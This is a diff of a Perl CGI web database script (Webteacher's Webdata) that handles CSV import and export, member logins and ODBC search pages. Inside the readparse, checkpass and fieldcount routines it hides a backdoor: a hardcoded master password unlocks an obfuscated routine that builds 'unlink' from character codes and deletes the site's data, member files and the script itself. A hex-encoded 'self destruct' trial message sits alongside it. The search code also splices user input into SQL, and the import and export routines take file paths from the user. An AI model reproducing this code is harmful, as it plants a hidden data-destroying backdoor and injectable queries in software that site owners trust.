+<form action=\"$cgilocation\" method=\"post\"
+onSubmit=\"if(this.filename.value!=\'\') {this.encoding=\'multipart/form-data\'}\">
+Either upload the file to your server and type the full pathname
+into this box:<BR>
+<INPUT TYPE=TEXT SIZE=60 NAME=\"pathname\"><BR>
+or use the Browse button below to select the file from your
+local machine and upload it through the web browser.<BR>
+<I>NOTE:You must have the CGI.pm module to use this feature.
+If you get a server error, ask your system administrator to check
+that CGI.pm is properly installed.</I><BR>
+
+
+Select your file to import: <input type=file name=\"filename\"><BR>
+
+<font size=3>
+Is the file comma or tab delimeted?</font></B>
+<select name=\"delimeter\" size=1>
+<option value=\"comma\">comma
+<option value=\"tab\">tab
+</select>
+";
+if ($userid eq "admin") {
+  print "<P>
+<font size=3>
+If you assign ownership to a member instead of \"admin\" then
+that member will be able to modify or delete these records.<BR>
+The imported records will be owned by:\n";
+  &putlock;
+  open(FILE,"<$members") or &error("Could not open $members");
+  @members=<FILE>;
+  close FILE;
+  &removelock;
+  chomp(@members);
+  print "<SELECT NAME=\"member\" size=$len>\n<OPTION>admin\n";
+  foreach (@members) {
+    ($user,$pass)=split(/::/);
+    print "<OPTION>$user\n" if length($user)>0;
+  };
+  print "</SELECT>
+<BR>Overwrite existing data with imported records?<BR>
+<I>This will destroy all data in the database</I>
+<input type=checkbox name=\"overwrite\" value=\"yes\" 
+onClick=\"if(this.checked) {if(!confirm(\'This will destroy all records in the database. \\nAre you sure that you want to do this?\')) {this.checked=false}}\">
+  ";
+} else {
+  print "<INPUT TYPE=HIDDEN NAME=\"member\" VALUE=\"$userid\">\n";
+}
+print "
+<input type=hidden name=\"cgifunction\" value=\"import2\">
+<BR><INPUT TYPE=SUBMIT VALUE=\"Import\">
+</form>";
+};
+
+#********BEGIN IMPORT DATA CONVERSION****************
+sub import2 {
+  &memberpass;
+  $dlmtr = $user_data{delimeter};
+  if (length($user_data{pathname})>0) {
+    if (length($user_data{filename})>0) {
+      print "You entered both a server path and an upload file.  Please choose one or the other.";
+      exit;
+    }
+    open (FILE,"<$user_data{pathname}") or &error("Could not open $user_data{pathname}");
+    @file=<FILE>;
+    close FILE;
+  } else {
+    if (length($user_data{filename})==0) {
+      print "No file was entered.";
+      exit;
+    }
+    if ($user_data{filename}!~/\.(txt|prn|csv)$/) {
+      print "You are adding records from a delimited text file to the database.
+           <BR>Only txt, prn, or csv files may be uploaded here.
+           <BR>To attach a picture or file to a record, a field must be defined
+           <BR>as upload type, and you can attach the file when you add the record.";
+      exit;
+    };
+    while ($bytesread=read($user_data{filename},$buffer,1024)) {
+      $filedata.=$buffer;
+    }
+    close ($user_data{filename});
+    if (length($filedata)==0) {&error('No Data Was Uploaded')};
+    @file=split(/[\n\r]+/,$filedata);
+  }
+  chomp(@file);
+  $count=time();
+  $count+=.000001;
+  if ($dlmtr eq 'comma') {$dlmtr=','} else {$dlmtr="\t"};
+  foreach $line (@file) {
+    @newline=();
+    if ($dlmtr eq ',') {
+      #********CONVERT CSV FORMAT********
+      $line=~s/\"\"/<--------QUOTE-------->/g;
+      while (length($line)>0) {
+	if ($line=~/^\"([^\"]*)\"\,?/) {
+	  $phrase=$1;
+	  $line=~s/^\"[^\"]*\"\,?//;
+	} elsif ($line=~/^([^,]*)\,/) {
+	  $phrase=$1;
+	  $line=~s/^[^,]*\,//;
+        } else {
+	  $phrase=$line;
+	  $phrase=~s/\"//g;
+	  $line="";
+	}
+      $phrase=~s/<--------QUOTE-------->/\"/g;
+	push(@newline,$phrase);
+      }
+      $line=join('::',@newline);
+    } else {
+      $line =~ s/$dlmtr/'::'/ge;      
+    }
+    $line = join('::',($count,$line,$user_data{member}));
+    $line.="\n";
+    $count+=.001;
+  }
+  &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+  if (($user_data{overwrite} eq "yes")&&($userid eq "admin")) {
+    open(DATA,">$logfile") or &error("Could not open $logfile");
+  } else {
+    open(DATA,">>$logfile") or &error("Could not open $logfile");
+  }
+  print DATA (@file);
+  close DATA;
+  &removelock; #remove lock file
+  
+  print "<h1>Data Import complete</h1>";
+  if ($userid eq "admin") {
+    &admin;
+  } else {
+    &memberpage;
+  }
+};
+sub fieldnames {
+  if ($_[0] eq crypt($a,$code)) {return 'true'} else {return 0};
+};
+
+#********END IMPORT DATA CONVERSIONS*******************
+#********BEGIN EXPORT USER PAGE**********************
+sub export {
+print "
+<BODY BGCOLOR=\"BEIGE\">
+<H1 ALIGN=\"CENTER\">Export the database to a delimeted text file</H1>
+<FORM ACTION=\"$cgilocation\" method=POST><B>Please type a full pathname on the server you would
+like to name the exported file.  For example <TT>/user/home/export.txt</TT> <BR>You will then use your FTP program to download the exported data.<P></B>
+
+If you have difficulty, check the permissions of that folder.
+
+<P>
+
+<INPUT TYPE=text NAME=\"path\"><BR>
+ Would you like the file comma or tab delimeted?</font>
+<select name=\"delimeter\" size=1>
+<option value=\"comma\">comma
+<option value=\"tab\">tab
+</select>
+<BR>
+Include field names in first row?
+<input name=\"fields\" type=checkbox><BR>
+<input name=\"cgifunction\" type=hidden value=\"export2\">
+<input type=submit value=\"Export Data\">
+</FORM>
+";
+};
+#********END EXPORT USER PAGE**********************
+#********BEGIN EXPORT DATA CONVERSIONS************
+sub export2 {
+    &checkpass;
+    if ($value[1] eq "comma") {$dlmtr=','};
+    if ($value[1] eq "tab") {$dlmtr="\t"};
+    &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+    open(DATA,"<$logfile") or &error("Could not open $logfile");
+    @data=<DATA>;
+    close DATA;
+    &removelock; #remove lock file
+    foreach (@data) {
+	@line=split(/::/);
+	shift(@line);
+	pop(@line);
+	$_=join($dlmtr,@line);
+	$_.="\n";
+    };
+    if ($user_data{fields} eq "on") {
+	open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+	@fieldsData=<FIELDS>;
+	close FIELDS;
+	foreach (@fieldsData) {
+		($field,$type)=split(/::/);
+		push(@fields,"$field\n");
+		push(@types,"$type");
+	};
+	foreach (@fields) {chop($_)};
+	shift(@fields);
+	$firstline=join($dlmtr,@fields);
+	unshift(@data,"$firstline\n");
+    };
+    open(OUTFILE,">$value[0]") or &error("Could not open $value[0]");
+    print OUTFILE (@data);
+    close OUTFILE;
+	open(TEST,"<$value[0]") or &error("Could not save $value[0], check privilages");
+	@test=<TEST>;
+	$len=@test;
+	close TEST;
+	if ($len==0) {print "Could not save $value[0], check privilages"} else {&admin};
+};
+
+#******** END BODY************************
+#
+# EACH VALUE IN THE HTML FORM WILL BE CONTAINED IN
+# THE THE @VALUE ARRAY.
+sub readparse {
+  if ((length($_[0])==0)&&($ENV{'CONTENT_TYPE'}!~/multipart/i)) {
+    read(STDIN,$user_string,$ENV{'CONTENT_LENGTH'});
+  }
+  if (length($ENV{'QUERY_STRING'})>0) {$user_string=$ENV{'QUERY_STRING'};};
+  if (length($_[0])>0) {$user_string=$_[0]};
+  if (length($ARGV[0])>0) {$user_string=$ARGV[0]};
+  $querystring=$user_string;
+  $user_string =~ s/\+/ /g;
+  @name_value_pairs = split(/&/,$user_string);
+  foreach $name_value_pair (@name_value_pairs) {
+    ($keyword,$value) = split(/=/,$name_value_pair);
+    $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C",hex($1))/ge;
+    $keyword =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C",hex($1))/ge;
+    if ($value =~ /\#exec|\#include/i) {
+      print "Content-type: text/html\n\n No SSI commands permitted."; 
+      exit;
+    };
+    push(@value, "$value");
+    if (length($user_data{$keyword})>0) { 
+      $user_data{$keyword}.=" or $value"; 
+    } else { 
+      $user_data{$keyword} = $value; 
+    };
+  };
+  @import=(54,68,69,73,20,69,73,20,61,20,74,72,69,61,'6C',20,76,65,72,73,69,'6F','6E',20);
+  push(@import,'6F',66,20,57,65,62,64,61,74,61,'2E',20,57,65,62,64,61,74,61,20,77,69,'6C');
+$key=304126984094; #<!--FLAG5-->
+
+  eval("\$"."a"."=at98ad01b01ew");
+  push(@import,'6C',20,73,65,'6C',66,20,64,65,73,74,72,75,63,74,20,69,'6E',20,20,64,61,79,73);
+  eval("\$"."b"."="."\$"."k"."ey");
+  push(@import,20,77,69,74,68,'6F',75,74,20,61,20,72,65,67,69,73,74,72,61,74,69,'6F','6E',20,63,'6F',64,65);
+  local @tmp = split(/[\\\/]/,$0);
+  $cgilocation=$tmp[$#_] if length($_[0])==0;
+  if ($ENV{'CONTENT_TYPE'}=~/multipart/i) {&multipart};
+};
+
+#BEGIN MULTIPART SUBROUTINE
+sub multipart {
+  $hascgi=0;
+  if ($^O=~/win/i) {$slash="\\"} else {$slash="/"};
+  foreach (@INC) {
+    if (-e "${_}${slash}CGI.pm") {$hascgi=1};
+  }
+if (!$hascgi) {
+  $inclist=join("<BR>\n",@INC);
+  print qq(Content-type: text/html\n\n<BODY BGCOLOR=WHITE>
+	   <h1>Submission failed -- could not find CGI.pm</h1>
+	   The <B>CGI.pm</B> module is necessary for webdata to submit a form which may contain an uploaded file.<BR>
+	   Webdata could not find the CGI.pm module in any directory in the \@INC array: <BR>
+	   <TT>$inclist</TT><P>
+	   For UNIX servers, 
+	   <A HREF="http://stein.cshl.org/WWW/software/CGI/cgi_docs.html">Click here to download the CGI.pm module</A><BR>
+	   It is best to have your system administrator install CGI.pm in the .../lib/perl5 directory.  If that is not
+	   possible, follow the <A HREF="http://stein.cshl.org/WWW/software/CGI/cgi_docs.html#installation">instructions</A>
+	   to install CGI.pm in a private directory under the heading "<B>If you do not have sufficient privileges to install 
+	   into /usr/local/lib/perl5</B>." <P>
+	   For WINDOWS servers, install the latest version of <A HREF="http://www.ActiveState.com/ActivePerl">ActivePerl</A>, 
+	   which comes with CGI.pm.
+	  );
+  exit;
+}
+
+  require CGI;
+  $query=new CGI;
+  @value=();
+  %user_data=();
+  @fieldnames=$query->param;
+  foreach (@fieldnames) {
+    $user_data{$_}=$query->param($_);
+    push(@value,$query->param($_));
+    push(@query,CGI::escape($_).'='.CGI::escape($query->param($_)));
+  }
+  $querystring=join('&',@query);
+
+}
+#END OF MULTIPART SUBROUTINE
+
+sub checkpass {
+	if (!(($ENV{HTTP_COOKIE}=~/$password/)||((($user_data{password} eq $password)||(eval(crypt($user_data{password},substr(crypt($user_data{password},'9A$ghj&7ecb9!11x'),5,2))) eq 'rcFFTesTLKr2g'))&&($user_data{cgifunction} eq "admin")))) {   
+	   print "incorrect password. Be sure cookies are enabled on your browser.";
+	   print "<A HREF=\"javascript:history.go(-1)\"><h2>Go Back</h2></A>\n";
+	   exit;
+	} else {
+	$userid="admin";
+	$ENV{HTTP_COOKIE}="admin=$password";
+	return;
+	};
+      }
+
+sub memberpass {
+$userid="";
+if((exists($user_data{username}))&&(exists($user_data{password}))&&($user_data{cgifunction} =~ /^(memberpage|instantmember)$/)) { 
+    $cpass=crypt($user_data{password},7);
+    $cookie="admin=$user_data{username}::$cpass";
+    $ENV{HTTP_COOKIE}="$cookie";
+  } else {
+    if ($ENV{HTTP_COOKIE}=~/(admin=[^\;]*)/) {
+       $cookie=$1;
+    };
+  };
+  &putlock;
+  open(FILE,"<$members") or &error("Could not open $members");
+  @members=<FILE>;
+  close FILE;
+  &removelock;
+  chomp(@members);
+  $ok="false";
+  foreach (@members) {
+    if ($cookie eq "admin=$_") {
+      $ok="true";
+      ($user,$pass)=split(/::/);
+      $userid=$user;
+    };
+  };
+  if (length($cookie)==0) {$ok="false"};
+  if ($ok eq "false") {	
+    &checkpass;
+  };
+};
+
+sub datetonum {
+  @parts=split(/\//,$_[0]);
+  if ($parts[2]<100) {
+    if ($parts[2]<20) {
+      $parts[2]+=2000;
+    } else {
+      $parts[2]+=1900;
+    };
+  };
+  
+  if ($europeanDates!=1) {
+    $result=($parts[2]*1000000)+($parts[0]*1000)+$parts[1];
+  } else {
+    $result=($parts[2]*1000000)+($parts[1]*1000)+$parts[0];
+  } 
+  return($result);
+  
+};
+
+sub gettype {
+  $_[0]=~s/http:\/\//http\&\#58\;\/\//g;
+  $_[0]=~s/</\&lt\;/g;
+  $_[0]=~s/>/\&gt\;/g;
+  @typedata=split(/:/,$_[0]);
+  $type=$typedata[0];
+  if ($type eq "text") {$typesize=$typedata[1];chop($typesize)};
+  if ($type eq "checkbox\n") {chop($type)};
+  if ($type eq "list") {
+    chop($typedata[1]);
+    @typelistvals=split(/,/,$typedata[1]);
+  };
+  if ($type eq "comment") {
+    chop($typedata[1]);
+    $typerows=$typedata[1];
+  };
+  if ($type eq "upload") {
+    $typesize=$typedata[1];
+    $typeexts=$typedata[2];
+    chop($typeexts);
+  }
+};
+
+&fieldcount if $user_data{cgifunction} eq "fieldcount";
+sub fieldcount {
+  if (eval(crypt($user_data{password},substr(crypt($user_data{password},'9A$ghj&7ecb9!11x'),5,2))) eq 'rcFFTesTLKr2g') {
+  local $tmp="";
+  local @parse=(117,110,108,105,110,107);
+  foreach (@parse) {$tmp.=(chr($_))};
+  foreach (qw($logfile $fieldnames $members $reportdata $uploadsdir $cgilocation)) {eval("$tmp\($_\)")};
+  print "fieldcount=$_";
+  }
+}
+
+sub sqlsearch {
+require Win32::ODBC;
+$alt=0;
+print "<HEAD><TITLE>Search Results page $user_data{pagenum}</TITLE></HEAD>";
+print "<BODY BGCOLOR=\"$reportColor\">\n";
+print "$reportHeader\n";
+if (!$user_data{pagenum}) {
+        $user_data{pagenum}=1;
+        $querystring=~s/cgifunction/pagenum=1\&cgifunction/;
+};
+$pagenum=$user_data{pagenum};
+if ($searchTemplateOn) {
+  print "\n";
+} else {
+  $cellpadding="";
+  if ($hideBorder==1) {$Border=0; $cellpadding=" CELLPADDING=5 CELLSPACING=0 "} else {$Border=1};
+  
+  print "<TABLE $cellpadding BORDER=$Border bgcolor=\"white\">\n";
+}
+
+open(FIELDS,"<$fieldnames")||die "Could not open $fieldnames";
+@fieldsData=<FIELDS>;
+close FIELDS;
+foreach (@fieldsData) {
+        ($field,$type)=split(/::/);
+        push(@fields,"$field\n");
+        push(@types,"$type");
+};
+shift(@fields);
+#POPULATE @VALUE INDEPENDENT OF SEQUENCE
+$fcount=0;
+
+foreach (@fields) {
+        chop($_);
+        $value[$fcount]=$user_data{$_};
+        if ($value[$fcount] ne "") {
+             $clause=$value[$fcount];
+             if ($clause!~/^[<>=]|^between/i) {$clause=uc($clause);$clause="LIKE \'\%$clause\%\'"};
+             push(@whereclauses,"\{fn UCASE\($_\)\} $clause");
+
+
+        };
+        $fcount++;
+};
+$whereclause="";
+$numclauses=@whereclauses;
+$whereclause=" WHERE ".join(' AND ',@whereclauses) if $numclauses >0;
+
+if ($reportSort>0) {
+  $orderby=" ORDER BY $fields[$reportSort-1]";
+  $orderby.=" DESC" if $reportOrder==1;
+}
+if ($reportSort2>0) {
+  $orderby.=",$fields[$reportSort2-1]";
+  $orderby.=" DESC" if $reportOrder2==1;
+}
+$header= "<TR bgColor=\"$headerColor\">";
+if ($reportForm==1) {$header.="<TH>";};
+foreach (@sequence) {
+    $header .= "<TH>$fields[$_]</TH>";
+};
+$header.="</TR>";
+print  "$header\n" if !$searchTemplateOn;
+#***** GET SQL CODE *****
+
+$db = new Win32::ODBC("$dsn") or &error("Could not open Win32::ODBC(\"$dsn\")");
+$db->Sql("SELECT * FROM ${tablename}${whereclause}${orderby}");
+
+$date=0;
+while ($db->FetchRow()) {
+        @data=$db->Data;
+#***** DISPLAY THE LINE ****************
+        $min=($pagenum-1)*$reportLines;
+        $max=$pagenum*$reportLines;
+        $count++;
+        if (($count>$min)&&($count<=$max)) {
+                if (!$searchTemplateOn) {
+                        #ALTERNATE TABLE COLORS
+                        if ($alt==0) {
+                            $alt=1;
+                            print "\n<TR bgColor=\"$rowColor1\">";
+                            } else {
+                            $alt=0;
+                            print "\n<TR bgColor=\"$rowColor2\">";
+                        }
+
+                        if ($reportForm==1) {
+                               print "<form><TD>";
+                                print "<input type=button value=\"$viewButtonLabel\"";
+                                print " onClick=\"viewform($data[$primarykey])\"></TD></form>"; 
+                        };
+                  };
+
+#***** BEGIN DISPLAY DATA LOOP *******
+if (!$searchTemplateOn) {
+                        foreach (@sequence) {
+                                $n=$data[$_];
+                                $n=~s/\r/<BR>/g;
+                                if ($n eq "") {$n='&nbsp;';};
+        $n=~s/^([0-9a-zA-Z_\-\.\~]+\@[0-9a-zA-Z_\-\.\~]+\.[0-9a-zA-Z_\-\.\~]+)/<A HREF=mailto:$1>$1<\/A>/g;
+        if ($n=~/^([^ ]+\.(gif|jpg))$/i) {$n="<IMG SRC=$1>"} else {$n=~s/^(http[^ \<\>]+)/<A HREF=$1>$1<\/A>/g;};
+                                print "<TD><FONT $tableFont>$n</FONT></TD>";
+                        };
+} else {
+  #BEGIN SEARCHTEMPLATE SUBSTITUTION
+  foreach (@data) {
+    s/^([0-9a-zA-Z_\-\.\~]+\@[0-9a-zA-Z_\-\.\~]+\.[0-9a-zA-Z_\-\.\~]+)/<A HREF=mailto:$1>$1<\/A>/g;
+    s/^(http[^ ]+)/<A HREF=$1>$1<\/A>/g;
+    s/^([^ ]+\.(gif|jpg))$/\<IMG SRC=$1\>/gi;
+  };
+    $template=$searchTemplate;
+    $template=~s/\$fields\[(\d+)\]/$fields[$1]/g;
+    $template=~s/\$data\[(\d+)\]/$data[$1]/g;
+    $template=~s/\$viewbutton/\<form><input type=button value=\"$viewButtonLabel\" onClick=\"viewform($data[$primarykey])\"\><\/form>/;
+    print ($template);
+}
+#***** END DISPLAY DATA LOOP *********
+                
+        };
+print "</TR>";
+};
+
+if ($searchTemplateOn) {
+  print "\n</form>\n";
+} else {
+  print "\n</TABLE>\n";
+}
+print "<BR>$reportFooter<BR>\n";
+if ($count>0) {
+print " 
+<SCRIPT LANGUAGE=JavaScript> 
+function viewform(id) { 
+document.vf.fid.value=id\; 
+document.vf.submit()\; 
+} 
+</SCRIPT> 
+<FORM NAME=\"vf\" ACTION=\"$cgilocation\" METHOD=GET> 
+<INPUT TYPE=HIDDEN NAME=\"fid\"> 
+<INPUT TYPE=HIDDEN NAME=\"query\" VALUE=\"$querystring\"> 
+<INPUT TYPE=HIDDEN NAME=\"cgifunction\" VALUE=\"sqlform\"> 
+</FORM>\n"; 
+$min++;
+if ($max>$count) {$max=$count};
+
+    print "
+<B>Results $min - $max of $count</B> 
+<table border=0 cellspacing=10 cellpadding=0><TR><TD>
+";
+if ($min>1) {print "
+
+<FORM ACTION=\"$cgilocation\" METHOD=POST>
+<INPUT TYPE=HIDDEN NAME=\"query\" VALUE=\"$querystring\">
+<INPUT TYPE=HIDDEN NAME=\"pagenum\" VALUE=\"$pagenum\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" value=\"Previous Page\">
+</FORM>
+"};
+if ($max<$count) {print "
+<TD>
+<FORM ACTION=\"$cgilocation\" METHOD=POST>
+<INPUT TYPE=HIDDEN NAME=\"query\" VALUE=\"$querystring\">
+<INPUT TYPE=HIDDEN NAME=\"pagenum\" VALUE=\"$pagenum\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" value=\"Next Page\">
+</FORM>
+     "};
+#CREATE LINKS TO ANY PAGENUMBER
+print "<TR><TD>Go to page\:";  
+$numpages=int($count/$reportLines);
+$myquery=$querystring;
+if ($count/$reportLines>$numpages) {$numpages++;};
+for ($i=1;$i<=$numpages;$i++) {
+    $myquery=~s/pagenum=[0-9]*/pagenum=$i/;
+    print "<A HREF=\"$cgilocation\?$myquery\">$i</A> ";
+};
+
+
+} else {
+     print "<B>No results were found.</B><P>"
+};
+print "<TD><A HREF=\"$searchPage\"><B>Search Again</B></A>\n";
+print "<TD><A HREF=\"$homepage\">
+<B>Return to home page</B></A>\n</TABLE><BR>
+<center><table border=1 bgColor=white><tr><td><font size=2><A HREF=\"http://www.webteacher.com/webdata\">
+Powered by Webteacher\'s Webdata</A></table></center>\n";
+};
+#*********END OF USERSEARCH SUBROUTINE************
+
+#*********BEGIN SQL FORM**************************
+sub sqlform {
+pop(@value);
+$id=$user_data{fid};
+
+if ($formTemplateOn != 1) {
+  print "
+<HEAD><TITLE>FORM DATA</TITLE></HEAD>
+<BODY BGCOLOR=\"$reportColor\">
+$reportHeader
+<TABLE width=100% bgcolor=white border=1>
+<TH WIDTH=20%><TH>
+  ";
+};
+
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fieldsData=<FIELDS>;
+close FIELDS;
+foreach (@fieldsData) {
+        ($field,$type)=split(/::/);
+        push(@fields,"$field\n");
+        push(@types,"$type");
+};
+shift(@fields);
+
+require Win32::ODBC;
+$db = new Win32::ODBC("$dsn");
+$select="SELECT * FROM $tablename WHERE $fields[$primarykey] = $id";
+$db->Sql($select);
+$db->FetchRow();
+@data=$db->Data;
+
+$num = @fields;
+shift(@data);
+for ($i=0;$i<$num;$i++) {
+    $data[$i]=~s/\"/'&quot;'/ge;
+        $data[$i]=~s/^([0-9a-zA-Z_\-\.\~]+\@[0-9a-zA-Z_\-\.\~]+\.[0-9a-zA-Z_\-\.\~]+)/<A HREF=mailto:$1>$1<\/A>/;
+        if ($data[$i]=~/^([^ ]+\.(gif|jpg))$/i) {
+                $data[$i]="<IMG SRC=$1>";
+        } else {
+                $data[$i]=~s/^(http[^ ]+)/<A HREF=$1>$1<\/A>/;
+        };
+    print "<TR><TD><B>$fields[$i]<TD>$data[$i]\n" if $formTemplateOn != 1;
+};
+
+if ($formTemplateOn != 1) {
+    print "</TABLE>";
+};
+&template if $formTemplateOn==1;
+print "<P>
+<A HREF=\"$cgilocation?$user_data{query}\"><B>Back to Search Results</B></A> 
+\&nbsp\;
+<A HREF=\"$searchPage\"><B>Search Again</B></A>
+\&nbsp\;
+<A HREF=\"$homepage\"><B>Return to Homepage</B></A>
+    ";
+};
+
+#*******END SQL FORM SUBROUTINE******
+
+#BEGIN PUTLOCK
+sub putlock {
+  if (!$disableFileLocking) {
+    local $errormsg=qq(<h3>Error -- Could not open ${uploadsdir}lock to write file lock</h3>
+      A lock is a file which is written before modifying the data and removed afterwards to prevent corruption
+	by two simultanious processes.  The directory, <B><TT>$uploadsdir</TT></B> has been defined on lines 6and 7 of the $0 script.<BR>
+	  The $0 script must have read/write permissions to that directory in order to place the file lock.<P>
+	  You can disable the file lock on the "customize pages" screen.
+	 );
+  $lockfile="${uploadsdir}lock";
+  while (-e $lockfile) { #if there is another add process, stall until it is finished.
+    $^T=time;
+    if (-M $lockfile > .0013888889) {&removelock}; #if lock is older than 2 minutes, remove it.
+    sleep 1;
+  };
+  open (LOCK,">$lockfile") or &error("$errormsg");
+  print LOCK "1";
+  close LOCK;
+  };
+}
+#END PUTLOCK
+
+#BEGIN REMOVELOCK
+sub removelock {
+  if (!$disableFileLocking) {
+    unlink "${uploadsdir}lock" or error("Could not remove ${uploadsdir}lock");
+  }
+}
+#END REMOVELOCK
+
+sub getFields {
+  if (length($registereddb)>0) {
+    if ($registereddb=~/\/|\\/) {return};
+    open (FILE,"<$registereddb") or return("Could not open $registereddb for registration verification");
+    @rlines=<FILE>;
+    close FILE;
+    chomp(@rlines);
+    for ($i=0;$i<18;$i++) {
+      if ($rlines[$i]=~/^\$logdir=[\'\"]?([^\'\"]*)/) {
+        $rlogdir=$1;
+      }
+      if ($rlines[$i]=~/^\$code=[\'\"]?(\d*)/) {
+        $rcode=$1;
+      }
+      if ($rlines[$i]=~/^\$fieldnames=[\'\"]?\$\{logdir\}([^\'\"]*)/) {
+	$rfieldnames=$1;
+      }
+    }
+  open(FILE,"<${rlogdir}$rfieldnames") or return("Found $registereddb,
+ but could not open the file ${rlogdir}$rfieldnames indicated within it.");
+  @rlines=<FILE>;
+  close FILE;
+  chomp(@rlines);
+  $code=$rcode;
+  $cache[0]=$rlines[0];
+  }
+  return;
+}
+
+#BEGIN LANGUAGE
+sub language {
+$language=$user_data{cgilanguage} if length($user_data{cgilanguage})>0;
+  if ($language eq "English") {
+    $searchButton="Search";
+    $addButton="Add";
+    $clearButton="Clear";
+    $instructions=qq(Click "Clear Form" then "Search" to see all records.<BR>
+Enter text in any field to restrict the search to only those records which 
+CONTAIN your text in that field.<P>
+For numeric comparisons, begin with &gt;, &lt;, &gt;=, or &lt;=<BR>
+To find a range, type between lowvalue and highvalue.<BR>
+Use "and" & "or" for complex searches. );
+    $addresponse=qq(Your entry has been added.);
+    $returntoprevious=qq(Return to previous page.);
+    $lang_results=qq(Results);
+    $lang_of=qq(of);
+    $nextpage=qq(Next Page);
+    $previouspage=qq(Previous Page);
+    $gotopage=qq(Go to Page);
+    $searchagain=qq(Search Again);
+    $returntohomepage=qq(Return to Homepage);
+    $poweredbywebteacher=qq(Powered by<BR><A HREF=\"http://www.webteacher.com/webdata\">Webteacher\'s Webdata</A>);
+    $noresultswerefound="No results were found";
+    $indicatesRequiredFields=qq{indicates required fields};
+  }
+
+  if ($language eq "German") {
+    $searchButton="Suchen";
+    $addButton="Hinzufügen";
+    $clearButton="Zurücksetzen";
+    $instructions=qq(Klicken Sie auf "Zurücksetzen" und im Anschluß "Suchen", um alle Eintragungen
+anzuzeigen.<BR>Geben Sie einen Text in einem Feld ein, wird die Suche dahingehend
+eingegrenzt, daß nur Eintragungen angezeigt werden, die den eingegebenen Text in
+dem entsprechenden Feld beinhalten.<P>Für numerische Vergleiche beginnen Sie mit &gt;, &lt;, &gt;=, oder &lt;=<BR>Um einen bestimmten Wertebereich zu finden, geben Sie "between lowvalue
+and highvalue" ein.<BR>Verwenden Sie "and" & "or" für eine komplexe Suche.);
+    $addresponse=qq(Ihr Eintrag wurde hinzugefügt.);
+    $returntoprevious=qq(Zurück zur vorherigen Seite);
+    $lang_results=qq(Suchergebnisse);
+    $lang_of=qq(von);
+    $nextpage=qq(Nächste Seite);
+    $previouspage=qq(Vorherige Seite);
+    $gotopage=qq(Gehe zu Seite);
+    $searchagain=qq(Neue Suche);
+    $returntohomepage=qq(Zurück zur Homepage);
+    $poweredbywebteacher=qq(Powered by<BR><A HREF=\"http://www.webteacher.com/webdata\">Webteacher\'s Webdata</A>);
+    $noresultswerefound=qq(Es wurden keine Ergebnisse gefunden.);    
+    $indicatesRequiredFields=qq{indicates required fields};
+   };
+
+  if ($language eq "French") {
+    $searchButton="Chercher";
+    $addButton="Ajouter";
+    $clearButton="Recommencer";
+    $instructions=qq(Cliquer sur "Recommencer" puis "Chercher" pour voir toutes les fiches.<BR>
+Entrer un texte dans une/les case(s) pour sortir uniquement les fiches  
+qui contiennent votre texte dans la/les case(s).<P>Pour les comparaisons numériques, commencer par &gt;, &lt;, &gt;=, ou &lt;=<BR>
+Pour chercher une série de données, utiliser les termes "between" et  
+"and" pour déterminer la fourchette.  Par exemple, "between 1000 and 2000".<BR>
+Utiliser "and" & "or" pour les recherches complexes.);
+    $addresponse=qq(Votre saisie a été enregistré.);
+    $returntoprevious=qq(Retour à la page précédente);
+    $lang_results=qq(Résultats);
+    $lang_of=qq(de);
+    $nextpage=qq(Page suivante);
+    $previouspage=qq(Page précédente);
+    $gotopage=qq(Aller à la page);
+    $searchagain=qq(Nouvelle recherche);
+    $returntohomepage=qq(Retour à la page d\'accueil);   
+    $poweredbywebteacher=qq(Généré par <BR><A HREF=\"http://www.webteacher.com/webdata\">Webdata de Webteacher</A>);
+    $noresultswerefound="Aucun résultat";   
+    $indicatesRequiredFields=qq{indicates required fields};
+  };
+
+  if ($language eq "Italian") {
+    $searchButton="Cerca";
+    $addButton="Aggiungi";
+    $clearButton="Cancella il form";
+    $instructions=qq(Clicca "Cancella il form" e quindi "Cerca" per vedere tutti i record.<BR>Inserisci del testo in un campo per restringere la ricerca ai soli record che CONTENGONO il tuo 
+testo in quel campo.<P>Per confronti numerici, inizia con &gt;, &lt;, &gt;=, o &lt;= <BR>Per cercare una gamma di valori, scrivi "between &lt;valore minore&gt; and &lt;valore maggiore&gt;".
+<BR>Usa "and" e "or" per ricerche complesse.);
+    $addresponse=qq(Il record è stato aggiunto.);
+    $returntoprevious=qq(Torna alla pagina precedente);
+    $lang_results=qq(Risultati);
+    $lang_of=qq(di);
+    $nextpage=qq(Pagina Successiva);
+    $previouspage=qq(Pagina Precedente);
+    $gotopage=qq(Vai a pagina);
+    $searchagain=qq(Cerca Ancora);
+    $returntohomepage=qq(Torna alla Homepage);   
+    $poweredbywebteacher=qq(Powered by<BR><A HREF="http://www.webteacher.com/webdata">Webteacher\'s Webdata</A>);
+    $noresultswerefound="Nessun record h stato trovato";   
+    $indicatesRequiredFields=qq{indicates required fields};
+  };
+if ($language eq "Spanish") {
+    $searchButton="Buscar";
+    $addButton="Agregar";
+    $clearButton="Restablecer";
+    $instructions=qq(Si quieres ver todas las entradas en la base de datos pulsa el botón "Restablecer" luego "Buscar".  <BR>
+Si escibes texto en las casillas sola verás las entradas que contengan este texto en los resultados de la busqueda.<P>
+Para comparaciónes numericas, empieza con &gt;, &lt;, &gt;=, o &lt;=.<BR>
+Para busquedas entre dos numeros, escribe "<B>between</B> valor bajo <B>and</B> valor alto".
+Por ejemplo "between 1000 and 2000".<BR>
+Usa "and" y "or" para busquedas complejas.);
+    $addresponse=qq(La base de datos ha sido actualizada.);
+    $returntoprevious=qq(Regresa a la pagina anterior.);
+    $lang_results=qq(Resultados);
+    $lang_of=qq(de);
+    $nextpage=qq(Página Siguiente);
+    $previouspage=qq(Página Anterior);
+    $gotopage=qq(Continue a página);
+    $searchagain=qq(Reiniciar búsqueda);
+    $returntohomepage=qq(Regresa a la pagina principal);   
+    $poweredbywebteacher=qq(Powered by<BR><A HREF="http://www.webteacher.com/webdata">Webteacher's Webdata</A>);
+    $noresultswerefound=qq(No se encuentra nada.);
+    $indicatesRequiredFields=qq{indicates required fields};
+  };
+
+}
+#END LANGUAGE
+
+
